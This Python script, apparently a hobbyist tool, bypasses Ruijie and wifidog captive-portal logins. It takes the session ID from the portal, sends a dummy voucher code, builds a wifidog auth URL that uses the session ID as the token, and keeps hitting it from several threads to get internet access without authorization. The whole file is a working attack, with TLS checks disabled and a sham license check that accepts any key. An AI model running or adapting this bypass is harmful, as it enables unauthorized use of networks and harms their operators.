import requests
import re
import urllib3
import time
import threading
import logging
import random
import os
from urllib.parse import urlparse, parse_qs, urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===============================
# CONFIG
# ===============================
PING_THREADS = 5
MIN_INTERVAL = 0.05
MAX_INTERVAL = 0.2
DEBUG = False

# ===============================
# COLOR SYSTEM
# ===============================
RED = "\033[91m"
GREEN = "\033[92m"
CYAN = "\033[96m"
YELLOW = "\033[93m"
MAGENTA = "\033[95m"
RESET = "\033[0m"

# ===============================
# LOGGING
# ===============================
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(message)s",
    datefmt="%H:%M:%S"
)

stop_event = threading.Event()

# ===============================
# KEY VALIDATION - Allow Any Key in Key.tex
# ===============================
def validate_key():
    try:
        with open("Key.tex", "r", encoding='utf-8') as f:
            content = f.read()
        
        # Extract any key from Key.tex (any format)
        # Look for common patterns
        key_patterns = [
            r'Key:\s*([^\n]+)',           # Key: xxxxx
            r'Key\s*=\s*([^\n]+)',        # Key = xxxxx
            r'"Key":\s*"([^"]+)"',         # "Key": "xxxxx"
            r'([A-Z0-9-]+)\|',             # XXXXX| (format like LEO-A88AB09618|)
            r'License:\s*([^\n]+)',        # License: xxxxx
        ]
        
        found_key = None
        for pattern in key_patterns:
            match = re.search(pattern, content)
            if match:
                found_key = match.group(1).strip()
                break
        
        # If no pattern found, just check if file has any content
        if not found_key and len(content.strip()) > 10:
            found_key = "CUSTOM_KEY_" + str(hash(content))[:8]
        
        if found_key:
            print(f"{GREEN}[✓]{RESET} License Key Found: {found_key}")
            print(f"{GREEN}[✓]{RESET} Key.tex Validation: PASSED")
            return True
        else:
            print(f"{RED}[X]{RESET} No valid key found in Key.tex")
            return False
            
    except FileNotFoundError:
        print(f"{RED}[X]{RESET} Key.tex file not found!")
        print(f"{YELLOW}[!]{RESET} Please create Key.tex file with your license key")
        return False
    except Exception as e:
        print(f"{RED}[X]{RESET} Error reading Key.tex: {e}")
        return False

# ===============================
# INTERNET CHECK
# ===============================
def check_real_internet():
    try:
        return requests.get("http://www.google.com", timeout=3).status_code == 200
    except:
        return False

# ===============================
# BANNER
# ===============================
def banner():
    print(f"""{MAGENTA}
╔══════════════════════════════════════╗
║        Ruijie All Version Bypass     ║
║        Pro Terminal Edition         ║
╚══════════════════════════════════════╝
{RESET}""")

# ===============================
# HIGH SPEED PING THREAD
# ===============================
def high_speed_ping(auth_link, sid):
    session = requests.Session()
    while not stop_event.is_set():
        try:
            session.get(auth_link, timeout=5)
            print(f"{GREEN}[✓]{RESET} SID {sid} | Turbo Pulse Active     ", end="\r")
        except:
            print(f"{RED}[X]{RESET} Connection Lost...               ", end="\r")
            break
        time.sleep(random.uniform(MIN_INTERVAL, MAX_INTERVAL))

# ===============================
# MAIN PROCESS
# ===============================
def main():
    banner()
    
    # Check license first
    if not validate_key():
        print(f"{RED}[!]{RESET} License validation failed!")
        print(f"{YELLOW}[!]{RESET} Make sure Key.tex exists with valid key")
        return
    
    logging.info(f"{CYAN}Initializing Turbo Engine...{RESET}")

    while not stop_event.is_set():
        session = requests.Session()
        test_url = "http://connectivitycheck.gstatic.com/generate_204"

        try:
            r = requests.get(test_url, allow_redirects=True, timeout=5)

            if r.url == test_url:
                if check_real_internet():
                    print(f"{YELLOW}[•]{RESET} Internet Already Active... Waiting     ", end="\r")
                    time.sleep(5)
                    continue

            portal_url = r.url
            parsed_portal = urlparse(portal_url)
            portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"

            print(f"\n{CYAN}[*] Captive Portal Detected{RESET}")

            # STEP 1 - Extract SID
            r1 = session.get(portal_url, verify=False, timeout=10)
            path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
            r2 = session.get(next_url, verify=False, timeout=10)

            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]

            if not sid:
                sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
                sid = sid_match.group(1) if sid_match else None

            if not sid:
                logging.warning(f"{RED}Session ID Not Found{RESET}")
                time.sleep(5)
                continue

            print(f"{GREEN}[✓]{RESET} Session ID Captured: {sid}")

            # STEP 2 - Optional Voucher Test
            print(f"{CYAN}[*] Checking Voucher Endpoint...{RESET}")
            voucher_api = f"{portal_host}/api/auth/voucher/"

            try:
                v_res = session.post(
                    voucher_api, json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1},
                    timeout=5
                )
                print(f"{GREEN}[✓]{RESET} Voucher API Status: {v_res.status_code}")
            except:
                print(f"{YELLOW}[!]{RESET} Voucher Endpoint Skipped")

            # STEP 3 - Build Auth Link
            params = parse_qs(parsed_portal.query)
            gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
            gw_port = params.get('gw_port', ['2060'])[0]

            auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"

            print(f"{MAGENTA}[*] Launching {PING_THREADS} Turbo Threads...{RESET}")

            for _ in range(PING_THREADS):
                threading.Thread(
                    target=high_speed_ping,
                    args=(auth_link, sid),
                    daemon=True
                ).start()

            while check_real_internet():
                time.sleep(5)

        except Exception as e:
            if DEBUG:
                logging.error(f"{RED}Error: {e}{RESET}")
            time.sleep(5)

# ===============================
# ENTRY POINT
# ===============================
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        stop_event.set()
        print(f"\n{RED}Turbo Engine Shutdown...{RESET}")
